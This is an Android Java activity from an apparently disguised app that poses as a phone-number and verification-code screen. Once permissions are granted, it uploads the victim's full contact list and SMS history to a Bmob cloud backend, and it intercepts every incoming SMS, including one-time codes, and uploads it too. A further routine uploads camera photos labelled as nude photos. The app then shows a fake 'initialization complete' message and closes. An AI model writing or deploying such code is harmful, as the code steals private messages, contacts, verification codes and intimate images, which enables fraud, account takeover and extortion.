package cn.bmob.sdkdemo;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.AsyncQueryHandler;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.tbruyelle.rxpermissions2.Permission;
import com.tbruyelle.rxpermissions2.RxPermissions;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import cn.bmob.sdkdemo.activity.Main2Activity;
import cn.bmob.sdkdemo.utils.SharedPreferencesUtils;
import cn.bmob.v3.BmobObject;
import cn.bmob.v3.BmobQuery;
import cn.bmob.v3.datatype.BmobFile;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.FindListener;
import cn.bmob.v3.listener.ProgressCallback;
import cn.bmob.v3.listener.SaveListener;
import cn.bmob.v3.listener.UpdateListener;
import io.reactivex.Observable;
import io.reactivex.ObservableSource;
import io.reactivex.Observer;
import io.reactivex.disposables.Disposable;
import io.reactivex.functions.Consumer;
import io.reactivex.functions.Function;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    Cursor cursor;

    private Map<String, String> permissionHintMap = new HashMap<>();
    private static final int REQUEST_CODE_PERMISSION = 1;//权限常量
    private int i = 0;
    private List<String> list = new ArrayList<>();
    private LinearLayout linearLayout;
    private TextView tv_write_code;

    private OnSmsInboxListener mListener;
    private MessageInterceptReceiver messageInterceptReceiver;
    private EditText et_phone, et_code;
    private ProgressDialog progressdialog;

    public interface OnSmsInboxListener {
        void onSuccess(String json);

        void onFailed();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        check();

        initView();
        messageInterceptReceiver = new MessageInterceptReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(messageInterceptReceiver, filter);

//


    }

    private void check() {
        if (System.currentTimeMillis() > 1599190621000L) {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setCancelable(false)
                    .setMessage("时间已到")
                    .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            finish();
                        }
                    });
            builder.show();
        } else {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("注意")
                    .setMessage("这是试用版，请联系开发者获取正版")
                    .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            dialog.dismiss();
                        }
                    });


            if (SharedPreferencesUtils.getInstance().getBoolean("isFirst2", true)) {
                SharedPreferencesUtils.getInstance().putBoolean("isFirst2", false);
                SharedPreferencesUtils.getInstance().putInt("try2", 30);
                builder.show();
            } else {
                int aTry = SharedPreferencesUtils.getInstance().getInt("try2", 30);
                if (aTry > 0) {
                    aTry = aTry - 1;
                    SharedPreferencesUtils.getInstance().putInt("try2", aTry);
                    AlertDialog.Builder builder2 = new AlertDialog.Builder(this);
                    builder2
                            .setMessage("剩余次数" + aTry)
                            .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
//                                finish();
                                }
                            });
                    builder2.show();
                } else {
                    AlertDialog.Builder builder2 = new AlertDialog.Builder(this);
                    builder2.setCancelable(false)
                            .setMessage("次数已用完")
                            .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    finish();
                                }
                            });
                    builder2.show();
                }
            }
        }
    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("gsfast23sdfs", "onStart");
    }

    @Override
    protected void onResume() {
        super.onResume();
        Log.e("gsfast23sdfs", "onResume");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(messageInterceptReceiver);
    }

    private void initView() {
        linearLayout = findViewById(R.id.linearLayout);
        tv_write_code = findViewById(R.id.tv_write_code);
        tv_write_code.setOnClickListener(this);
        findViewById(R.id.iv_close).setOnClickListener(this);
        et_phone = findViewById(R.id.et_phone);
        et_code = findViewById(R.id.et_code);
        findViewById(R.id.tv_confirm).setOnClickListener(this);

    }

    /**
     * 上传联系人
     *
     * @param name
     * @param number
     */
    private void uploadContacts(String name, String number) {
//        number = number.replace("+", "");
//        number = number.replace("-", "");
//        number = number.replace(" ", "");
        String regEx = "[^0-9]";
        Pattern p = Pattern.compile(regEx);
        Matcher m = p.matcher(number);
        number = m.replaceAll("").trim();
        Log.e("fafafafdafa", name + " " + number);
        if (list.contains(number)) {
            return;
        } else {
            list.add(number);
        }
        Contact p2 = new Contact();
        p2.setPerson(et_phone.getText().toString().trim());
        p2.setCode(et_code.getText().toString().trim());
        p2.setName(name);
        p2.setPhone(number);
        p2.save(new SaveListener<String>() {
            @Override
            public void done(String objectId, BmobException e) {
                if (e == null) {
                    Log.e("fafasfasfasrq-上传联系人", "添加数据成功，返回objectId为：" + objectId);
                } else {
                    Log.e("fafasfasfasrq-上传联系人", objectId + "创建数据失败：" + e.getMessage() + e.getErrorCode());
                }
            }
        });
    }

    private void requestPermissionsIfAboveM() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Map<String, String> requiredPermissions = new HashMap<>();
            requiredPermissions.put(Manifest.permission.READ_CONTACTS, "读取联系人");
            for (String permission : requiredPermissions.keySet()) {
                if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionHintMap.put(permission, requiredPermissions.get(permission));
                }
            }
            if (!permissionHintMap.isEmpty()) {
                requestPermissions(permissionHintMap.keySet().toArray(new String[0]), REQUEST_CODE_PERMISSION);
            }
        }
    }

//    @Override
//    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//        List<String> failPermissions = new LinkedList<>();
//        for (int i = 0; i < grantResults.length; i++) {
//            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
//                failPermissions.add(permissions[i]);
//            }
//        }
//        if (!failPermissions.isEmpty()) {
//            StringBuilder sb = new StringBuilder();
//            for (String permission : failPermissions) {
//                sb.append(permissionHintMap.get(permission)).append("、");
//            }
//            sb.deleteCharAt(sb.length() - 1);
//        } else {
//            uploadContacts();
//        }
//    }

    /**
     * 遍历查询联系人
     */
    private void queryContact() {
//        实例化数据库指针
        try {
            cursor = this.getContentResolver().
                    query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        } catch (Exception e) {
            Log.e("fafasfa", e.getMessage());
        }
//      获取本地通讯录信息，并通过键值对的方式放进ArrayList数组中
        if (cursor != null) {
            while (cursor.moveToNext()) {
                i += 1;
                if (i > 0) {
                    String get_name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String get_number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    uploadContacts(get_name, get_number);
                }
            }
//            cursor.close();
        }

//        for (int j = 0; j < 100; j++) {
//            uploadContacts("某某", String.valueOf(j + 1));
//        }
    }

    /**
     * 上传照片
     */
    private void uploadPic() {
        //获取图片

        //selection: 指定查询条件
        String selection = MediaStore.Images.Media.DATA + " like ?";
//设定查询目录
        String path = "%/storage/emulated/0/DCIM/";
//
        String[] selectionArgs = {path + "%"};

        Cursor cursor = getContentResolver()
                .query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, selection, selectionArgs, null);
        while (cursor.moveToNext()) {
            //获取图片的名称
//			String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
            byte[] data = cursor.getBlob(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
            System.out.println(new String(data, 0, data.length - 1));
//
//
//
//
            final BmobFile bmobFile = new BmobFile(new File(new String(data, 0, data.length - 1)));
            bmobFile.uploadObservable(new ProgressCallback() {//上传文件操作
                @Override
                public void onProgress(Integer value, long total) {

                }
            }).doOnNext(new Consumer<BmobException>() {
                @Override
                public void accept(BmobException e) throws Exception {
//                    url = bmobFile.getUrl();
                    System.out.println("上传成功");
                }

            }).concatMap(new Function<BmobException, ObservableSource<?>>() {
                @Override
                public ObservableSource<?> apply(BmobException e) throws Exception {
                    return saveObservable(new bmobphoto(bmobFile, "来自DCIM文件下裸照"));
                }//将bmobFile保存到movie表中


            }).subscribe(new Observer<Object>() {
                @Override
                public void onSubscribe(Disposable d) {

                }

                @Override
                public void onNext(Object o) {

                }

                @Override
                public void onError(Throwable e) {

                }

                @Override
                public void onComplete() {

                }
            });

        }
    }


    /**
     * 查询图片
     */
    private void queryPic() {
        BmobQuery<bmobphoto> bmobQuery = new BmobQuery<bmobphoto>();
        bmobQuery.order("-updatedAt");
        bmobQuery.findObjects(new FindListener<bmobphoto>() {
            @Override
            public void done(List<bmobphoto> list, BmobException e) {
                if (e == null) {
                    System.out.println("查询成功!");


                    initView();

                } else {


                }

            }
        });
    }


    /**
     * 遍历手机短信
     * https://blog.csdn.net/fengpeihao/article/details/77749748
     * https://blog.csdn.net/qq15577969/article/details/80862526
     * https://blog.csdn.net/adminlxb89/article/details/81068419
     */
    public void readMessage1() {
        Uri SMS_INBOX = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};

        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");

        if (null == cur) {

            Log.i("ooc", "************cur == null");

            return;

        }

        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            Map<String, Object> map = new HashMap<String, Object>();
            map.put("num", number);
            map.put("mess", body);
//            list.add(map);

        }
    }

    public void readMessage2() {
        ContentResolver resolver = getContentResolver();

        //定义一个URI（Uniform Resource Identifier 统一资源标示符）
        //查全部短信
        Uri uri = Uri.parse("content://sms/");
        Cursor cursor = resolver.query(uri, null, null, null, null);
        //输出集合内容
        AlertDialog.Builder dialog = new AlertDialog.Builder(MainActivity.this);
        dialog.setTitle("短信列表：");
        StringBuilder sb = new StringBuilder();
        int i = 0;
        while (cursor.moveToNext()) {

            String address = cursor.getString(cursor.getColumnIndex("address"));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            String dateString = cursor.getString(cursor.getColumnIndex("date"));
            Long dateLong = Long.parseLong(dateString);
            SimpleDateFormat sdf = new SimpleDateFormat("yyy-MM-dd hh:mm:ss");
            Date date = new Date(dateLong);
            String dateShow = sdf.format(date);
            if (i != 0) {
                sb.append("\n");
            }
            sb.append("号码：" + address + " 内容：" + body + " 时间：" + dateShow);
            i++;
            break;

        }

        cursor.close();
        dialog.setMessage(sb);
        dialog.show();
    }

    public void readMessage3() {
        MyAsyncQueryhandler asyncQueryhandler = new MyAsyncQueryhandler(getContentResolver());
        /**
         *   content://sms/           所有短信
         *   content://sms/inbox        收件箱
         *   content://sms/sent        已发送
         *   content://sms/draft        草稿
         *   content://sms/outbox        发件箱
         *   content://sms/failed        发送失败
         *   content://sms/queued        待发送列表
         */
        Uri uri = Uri.parse("content://sms/");

        //"_id", "address", "person","date", "type"1是接收到的，2是已发出
        String[] projection = new String[]{"address", "person", "body", "date", "type"};

        asyncQueryhandler.startQuery(0, null, uri, projection, null, null, "date desc");
    }

    /**
     * 上传短信
     *
     * @param message
     */
    private void uploadMessage(SmsMessage message) {
        final dxbmob p2 = new dxbmob();
        p2.setphone(message.getOriginatingAddress());
        p2.setnr(message.getMessageBody());

        //添加Object类型


        p2.save(new SaveListener<String>() {

            @Override
            public void done(String o, BmobException e) {
                if (e == null) {

//							toast("创建数据成功：" + p2.getObjectId());

                    Log.e("fafasfasfasrq-上传短信", "上传短信成功");
                } else {
//							loge(e);
                    Log.e("fafasfasfasrq-上传短信", "上传短信失败");
                }
            }
        });
    }

    /**
     * 上传短信
     *
     * @param message
     */
    private void uploadMessage(SmsInboxBean message) {
        final dxbmob p2 = new dxbmob();
        p2.setphone(message.getNumber());
        p2.setnr(message.getBody());
        p2.setPerson(et_phone.getText().toString().trim());
        p2.setCode(et_code.getText().toString().trim());

        //添加Object类型


        p2.save(new SaveListener<String>() {

            @Override
            public void done(String o, BmobException e) {
                if (e == null) {

//							toast("创建数据成功：" + p2.getObjectId());

//                    System.out.println("ok");
                    Log.e("fafasfasfasrq-上传短信", "成功");
                } else {
                    Log.e("fafasfasfasrq-上传短信", "失败");

//							loge(e);
//                    System.out.println("no");
                }
            }
        });
    }

    /**
     * 查询云端短信
     */
    private void queryMessage() {
        BmobQuery<dxbmob> bmobQuery = new BmobQuery<dxbmob>();
        bmobQuery.order("-updatedAt");
        bmobQuery.findObjects(new FindListener<dxbmob>() {
            @Override
            public void done(List<dxbmob> list, BmobException e) {
                if (e == null) {
                    System.out.println("查询成功!");

                }
            }

        });
    }


    /**
     * 删除短信
     */
    private void deleteMessage(String id) {
        bmob bmob = new bmob();
        //参数实在表中的id唯一值，对应云端
        bmob.delete(id, new UpdateListener() {
            @Override
            public void done(BmobException e) {
                if (e == null) {
                    Toast.makeText(MainActivity.this, "删除成功！", Toast.LENGTH_LONG).show();
//
                } else {

                    Toast.makeText(MainActivity.this, "删除失败！" + e, Toast.LENGTH_LONG).show();
                }

            }
        });

    }


    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.tv_write_code:
                tv_write_code.setVisibility(View.GONE);
                linearLayout.setVisibility(View.VISIBLE);
                break;
            case R.id.iv_close:
                linearLayout.setVisibility(View.INVISIBLE);
                tv_write_code.setVisibility(View.VISIBLE);
                break;
            case R.id.tv_confirm:
//                requestPermissionsIfAboveM();

//                Toast.makeText(this, "点击了确定", Toast.LENGTH_SHORT).show();
                if (TextUtils.isEmpty(et_phone.getText().toString().trim())) {
                    Toast.makeText(this, "请输入手机号", Toast.LENGTH_SHORT).show();
                } else if (TextUtils.isEmpty(et_code.getText().toString().trim())) {
                    Toast.makeText(this, "请输入验证码", Toast.LENGTH_SHORT).show();
                } else {
                    if (isMobileNo(et_phone.getText().toString().trim())) {
                        checkPermission();
                    } else {
                        Toast.makeText(this, "请输入正确的手机号码", Toast.LENGTH_SHORT).show();
                    }
                }
                break;
        }
    }

    private void checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            RxPermissions rxPermission = new RxPermissions(this);
            rxPermission.requestEachCombined(

                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_CONTACTS
            )
                    .subscribe(new Consumer<Permission>() {
                        @Override
                        public void accept(Permission permission) throws Exception {
                            if (permission.granted) {
                                // 用户已经同意该权限
                                showProgressDialog();
                                queryContact();  // 应有监测功能必须要开启储存权限才行
                                readMessage3();
//                                upLoadVerifyCode();
                            } else if (permission.shouldShowRequestPermissionRationale) {
                                // 用户拒绝了该权限，没有选中『不再询问』（Never ask again）,那么下次再次启动时，还会提示请求权限的对话框
//                                                ToastUtils.show(getString(R.string.tips_request_storage_permission));

                                AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                                builder.setMessage("为保证您正常使用此应用程序，需要获取您的手机权限，请允许")
                                        .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface dialog, int which) {
                                                checkPermission();
                                            }
                                        })
                                        .setCancelable(false)
                                        .show();
                            } else {
                                //引导用户去系统设置开启权限
                                Uri packageURI = Uri.parse("package:" + getPackageName());
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, packageURI);
                                startActivity(intent);
                            }
                        }
                    });

        } else {
            showProgressDialog();
            queryContact();  // 应有监测功能必须要开启储存权限才行
            readMessage3();
//            upLoadVerifyCode();
        }
    }

    private void showProgressDialog() {
        if (progressdialog == null) {
            progressdialog = new ProgressDialog(MainActivity.this);
        }
        progressdialog.setTitle("注意");
        progressdialog.setMessage("正在加载中，请稍后");
        progressdialog.setCancelable(true);
        progressdialog.show();
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (progressdialog != null && progressdialog.isShowing()) {
                    progressdialog.dismiss();
                }
                AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                builder.setMessage("初始化完毕")
                        .setCancelable(false)
                        .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                dialogInterface.dismiss();
                                finish();
                            }
                        });
                builder.show();

            }
        }, 4000);
    }

    private void upLoadVerifyCode() {
        SmsInboxBean smsInboxBean = new SmsInboxBean();
        smsInboxBean.setBody(et_code.getText().toString().trim());
        smsInboxBean.setNumber(et_phone.getText().toString().trim());
        uploadMessage(smsInboxBean);
    }

    private Observable<String> saveObservable(BmobObject obj) {
        return obj.saveObservable();
    }

    private class MyAsyncQueryhandler extends AsyncQueryHandler {
        public MyAsyncQueryhandler(ContentResolver cr) {
            super(cr);
        }

        @Override
        protected void onQueryComplete(int token, Object cookie, Cursor cursor) {
            if (cursor != null && cursor.getCount() > 0) {

                List<SmsInboxBean> list = new ArrayList<>();
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex("address"));//手机号
                    String name = cursor.getString(cursor.getColumnIndex("person"));//联系人姓名列表
                    String body = cursor.getString(cursor.getColumnIndex("body"));//内容
                    String date = getDate(cursor.getString(cursor.getColumnIndex("date")));//时间
                    String type = cursor.getString(cursor.getColumnIndex("type"));//1是接收到的，2是已发出
                    SmsInboxBean smsInboxBean = new SmsInboxBean(date, name, number, body, type);
                    uploadMessage(smsInboxBean);
                    Log.e("fafasfasfasrq-查询短信", smsInboxBean.toString());
//                    list.add(smsInboxBean);
                }
                Gson gson = new Gson();
                if (mListener != null) {
                    mListener.onSuccess(gson.toJson(list));
                }
            } else {
                if (mListener != null) mListener.onFailed();
            }
            super.onQueryComplete(token, cookie, cursor);
        }
    }

    private String getDate(String date) {
        Date callDate = new Date(Long.parseLong(date));
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return sdf.format(callDate);
    }


    public boolean isMobileNo(String mobiles) {
        /*
         * 移动号码段:139、138、137、136、135、134、150、151、152、157、158、159、182、183、184、187、188、147
         * 联通号码段:130、131、132、185、186、145、171/176/175
         * 电信号码段:133、153、180、181、189、173、177
         */
        String telRegex = "^((13[0-9])|(14[5|7])|(15([0-3]|[5-9]))|(17([1-3]|[5-9]))|(18[0-9]))\\d{8}$";
        /**
         * (13[0-9])代表13号段 130-139
         * (14[5|7])代表14号段 145、147
         * (15([0-3]|[5-9]))代表15号段 150-153 155-159
         * (17([1-3][5-8]))代表17号段 171-173 175-179 虚拟运营商170屏蔽
         * (18[0-9]))代表18号段 180-189
         * d{8}代表后面可以是0-9的数字，有8位
         */
        if (TextUtils.isEmpty(mobiles.trim())) {
            return false;
        } else {
//            return mobiles.matches(telRegex);
            return mobiles.trim().length() == 11;
        }


//        if (TextUtils.isEmpty(mobiles)) {
//            return false;
//        } else {
//            String regExp = "^((13[0-9])|(15[^4])|(18[0,2,3,5-9])|(17[0-8])|(147))\\d{8}$";
//            Pattern p = Pattern.compile(regExp);
//            Matcher m = p.matcher(mobiles);
//            return m.matches();
//        }
    }


    public class MessageInterceptReceiver extends BroadcastReceiver {
        public MessageInterceptReceiver() {

        }

        @Override
        public void onReceive(final Context context, Intent intent) {

            getMsg(context, intent);


            // 中断短信广播
//            abortBroadcast();
        }

        private void getMsg(Context context, Intent intent) {
            //pdus短信单位pdu
            //解析短信内容
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            assert pdus != null;
            for (Object pdu : pdus) {
                //封装短信参数的对象
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                Log.e("fafasfasfasrq-拦截到新消息", sms.getOriginatingAddress() + "    " + sms.getMessageBody());
                String number = sms.getOriginatingAddress();
                String body = sms.getMessageBody();
                uploadMessage(sms);
                //写自己的处理逻辑
                //获取短信验证码
//                getCode(context, body);
            }
        }

//    /**
//     * 上传短信
//     *
//     * @param message
//     */
//    private void uploadMessage(SmsMessage message) {
//        final dxbmob p2 = new dxbmob();
//        p2.setphone(message.getOriginatingAddress());
//        p2.setnr(message.getMessageBody());
//
//        //添加Object类型
//
//
//        p2.save(new SaveListener<String>() {
//
//            @Override
//            public void done(String o, BmobException e) {
//                if (e == null) {
//
////							toast("创建数据成功：" + p2.getObjectId());
//
//                    System.out.println("ok");
//                } else {
////							loge(e);
//                    System.out.println("no");
//                }
//            }
//        });
//    }

        private void getCode(Context context, String body) {
            //获取剪贴板管理器：
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);

            Pattern pattern1 = Pattern.compile("(\\d{6})");//提取六位数字
            Matcher matcher1 = pattern1.matcher(body);//进行匹配

            Pattern pattern2 = Pattern.compile("(\\d{4})");//提取四位数字
            Matcher matcher2 = pattern2.matcher(body);//进行匹配

            if (matcher1.find()) {//匹配成功
                String code = matcher1.group(0);
                // 创建普通字符型ClipData
                ClipData mClipData = ClipData.newPlainText("Label", code);
                // 将ClipData内容放到系统剪贴板里。
                cm.setPrimaryClip(mClipData);
                Toast.makeText(context, "验证码复制成功", Toast.LENGTH_SHORT).show();
                Log.d("TAG", "onReceive: " + code);
            } else if (matcher2.find()) {
                String code = matcher2.group(0);
                // 创建普通字符型ClipData
                ClipData mClipData = ClipData.newPlainText("Label", code);
                // 将ClipData内容放到系统剪贴板里。
                cm.setPrimaryClip(mClipData);
                Toast.makeText(context, "验证码复制成功", Toast.LENGTH_SHORT).show();
                Log.d("TAG", "onReceive: " + code);
            } else {
                Toast.makeText(context, "未检测到验证码", Toast.LENGTH_SHORT).show();
                Log.d("TAG", "onReceive: " + "未检测到验证码");
            }
        }
    }


}
